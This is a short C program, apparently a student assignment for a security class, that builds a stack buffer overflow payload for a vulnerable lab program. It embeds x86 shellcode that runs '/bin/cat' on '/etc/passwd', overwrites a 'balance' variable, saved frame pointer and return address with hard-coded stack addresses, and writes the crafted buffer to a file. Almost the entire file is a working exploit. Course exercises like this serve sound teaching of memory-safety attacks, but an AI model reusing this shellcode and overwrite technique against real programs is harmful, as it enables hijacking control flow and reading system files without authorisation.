/*
 * Author: Nate Koch
 * Date: 1 May 2022
 * Class: CIS 436
 */

#include <stdio.h>
#include <string.h>

const unsigned char shellcode[]="\xeb\x1f\x5b\x31\xc0\x88\x43\x0b\x88\x43\x18\x89\x5b\x19\x8d\x4b\x0c\x89\x4b\x1d\x89\x43\x21\xb0\x0b\x8d\x4b\x19\x8d\x53\x21\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x63\x61\x74\x23\x2f\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x41\x4a\x49\x54\x48\x41\x4a\x49\x54\x48\x4b\x50";

int main() {
  int i;
  unsigned char buf[256]; //must use unsigned char due to sign extension 
  FILE *fp;

  memset(buf ,'a', 256); // make it 256 bytes
  memcpy(buf, shellcode, 75); 

printf("\n shellcode[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",shellcode[i]);}

for (i=0; i<75;i++){buf[i]=shellcode[i];}
printf("\n buf[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",buf[i]);}

  *((unsigned*)(&buf[160])) = 0x075bcd15;  // put 123456789 into balance
  *((unsigned*)(&buf[172])) = 0xffffdaf8;  // put x/1xw $ebp from proc_input here, where 172 = $ebp - &buf
  *((unsigned*)(&buf[176])) = 0xffffd90c;  // put &buf from proc_input here, where 176 = $ebp -&buf +4

printf("\n buf[160]=\n"); for (i=160; i<177;i++){printf("%02x ",buf[i]);}

  fp = fopen("abc", "w");
  fwrite(buf, 1, 256, fp);

  fclose(fp);
}
